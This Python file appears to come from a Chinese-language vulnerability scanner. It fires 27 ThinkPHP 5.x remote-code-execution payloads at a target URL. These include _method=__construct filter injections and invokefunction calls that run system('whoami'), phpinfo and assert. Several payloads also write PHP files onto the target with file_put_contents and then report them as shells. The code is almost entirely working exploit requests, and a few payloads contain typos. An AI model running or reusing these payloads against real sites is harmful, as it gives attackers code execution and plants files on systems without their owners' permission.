#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            response = requests.post(url,headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-1')
                
        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-1')

    def run2(self,urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-2')


    def run3(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-3')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-3')

    def run4(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "s=ipconfig&_mehthod=__construct$method=&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code== 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.1-RCE-POC-4 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-4')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-4')
    def run5(self, urls):
        try:
            url = urls + '/public/index.php?s=index/index/index'
            data = "s=whoami&_method=__construct&method&filter[]=syste"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code== 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.10-RCE-POC ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.10-RCE-POC')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.10-RCE-POC')
    def run6(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "s=whoami&_method=__construct&method=POST&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code== 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.12-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-1')
    def run7(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code== 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.12-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-2')
    def run8(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.12-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-3')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-3')
    def run9(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=whoami&_method=__construct&method=POST&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-1')
    def run10(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-2')
    def run11(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-3')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-3')
    def run12(self, urls):
        try:
            url = urls + '/?s=index/think\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)


            url2 = urls + "/shell.php.jpg"
            res2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                 proxies=self.proxy)
            if "disable_functions" in res2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.14-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-1')
    def run13(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.14-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-2')
    def run14(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=whoami&_method=__construct&method=POST&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-1')
    def run15(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-2')
    def run16(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-3')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-3')
    def run17(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/zerosec.php"
            resp2 = requests.get(url2, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            resp2.encoding = response.apparent_encoding
            if "disable_functions" in resp2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.15-RCE-POC-4 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}")

            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-4')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-4')
    def run18(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.18-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-1')
    def run19(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.18-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-2')
    def run20(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.21-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')
    def run21(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.21-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.21-RCE-POC-1')
    def run22(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]='
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.22-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.22-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.22-RCE-POC-1')

    def run23(self, urls):
        try:
            url = urls + '/public'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            response = requests.get(url, headers=self.headers, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.8-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-1')
    def run24(self, urls):
        try:
            url = urls + '/public'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/zerosec.php"
            response2 = requests.get(url2, headers=self.headers,verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.8-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}")

            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-2')

    def run25(self, urls):
        try:
            url = urls + '/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uploads/1321231.php&vars[1][]=<?php phpinfo();?>'

            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/uploads/1321231.php"
            response2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.8-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}")

            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-3')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-3')
    def run26(self, urls):
        try:
            url = urls + '/?s=index/\think\Request/input&filter=phpinfo&data=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.1.29-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")

            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-1')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-1')
    def run27(self, urls):
        try:
            url = urls + '/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.1.29-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")

            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-2')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-2')

    def main(self, target):
        OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header, proxy=proxy)
        
        self.headers = req["header"]
        self.proxy = req["proxy"]
        OutPrintInfo("ThinkPHP", '检测5.x RCE注入')
        OutPrintInfo("ThinkPHP", '开始POC-0...')
        self.run(url)
        OutPrintInfo("ThinkPHP", '开始POC-1...')
        self.run2(url)
        OutPrintInfo("ThinkPHP", '开始POC-2...')
        self.run3(url)
        OutPrintInfo("ThinkPHP", '开始POC-3...')
        self.run4(url)
        OutPrintInfo("ThinkPHP", '开始POC-4...')
        self.run5(url)
        OutPrintInfo("ThinkPHP", '开始POC-5...')
        self.run6(url)
        OutPrintInfo("ThinkPHP", '开始POC-6...')
        self.run7(url)
        OutPrintInfo("ThinkPHP", '开始POC-7...')
        self.run8(url)
        OutPrintInfo("ThinkPHP", '开始POC-8...')
        self.run9(url)
        OutPrintInfo("ThinkPHP", '开始POC-9...')
        self.run10(url)
        OutPrintInfo("ThinkPHP", '开始POC-10...')
        self.run11(url)
        OutPrintInfo("ThinkPHP", '开始POC-11...')
        self.run12(url)
        OutPrintInfo("ThinkPHP", '开始POC-12...')
        self.run13(url)
        OutPrintInfo("ThinkPHP", '开始POC-13...')
        self.run14(url)
        OutPrintInfo("ThinkPHP", '开始POC-14...')
        self.run15(url)
        OutPrintInfo("ThinkPHP", '开始POC-15...')
        self.run16(url)
        OutPrintInfo("ThinkPHP", '开始POC-16...')
        self.run17(url)
        OutPrintInfo("ThinkPHP", '开始POC-17...')
        self.run18(url)
        OutPrintInfo("ThinkPHP", '开始POC-18...')
        self.run19(url)
        OutPrintInfo("ThinkPHP", '开始POC-19...')
        self.run20(url)
        OutPrintInfo("ThinkPHP", '开始POC-20...')
        self.run21(url)
        OutPrintInfo("ThinkPHP", '开始POC-21...')
        self.run22(url)
        OutPrintInfo("ThinkPHP", '开始POC-22...')
        self.run23(url)
        OutPrintInfo("ThinkPHP", '开始POC-23...')
        self.run24(url)
        OutPrintInfo("ThinkPHP", '开始POC-24...')
        self.run25(url)
        OutPrintInfo("ThinkPHP", '开始POC-25...')
        self.run26(url)
        OutPrintInfo("ThinkPHP", '开始POC-26...')
        self.run27(url)



        OutPrintInfo("ThinkPHP", 'RCE检测结束')